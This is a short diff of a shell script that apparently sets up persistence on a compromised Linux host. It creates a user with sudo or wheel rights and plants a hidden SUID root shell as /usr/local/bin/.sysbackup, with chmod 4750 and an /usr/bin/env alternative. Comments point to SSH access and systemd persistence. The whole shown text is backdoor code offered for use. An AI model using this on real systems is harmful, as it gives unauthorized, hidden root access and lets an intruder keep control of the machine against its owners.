@@ -64,7 +64,7 @@ echo
 
 useradd -m -s /bin/bash "$USR"
 echo "$USR:$PASS" | chpasswd
-usermod -aG sudo "$USR" 2>/dev/null
+usermod -aG sudo "$USR" 2>/dev/null || usermod -aG wheel "$USR" 2>/dev/null 
 # su - <user> → to start a new session if already exists
 
 echo "[+] User $USR created"
@@ -73,7 +73,9 @@ echo "[+] User $USR created"
 echo "[+] Creating SUID shell..."
 
 cp /bin/bash /usr/local/bin/.sysbackup
-chmod +s /usr/local/bin/.sysbackup
+# alternative → cp /usr/bin/env /usr/local/bin/.sysbackup # usage → .sysbackup /bin/sh
+chown root:$USR /usr/local/bin/.sysbackup
+chmod 4750 /usr/local/bin/.sysbackup
 
 #SSH → access
 #systemd → persistence
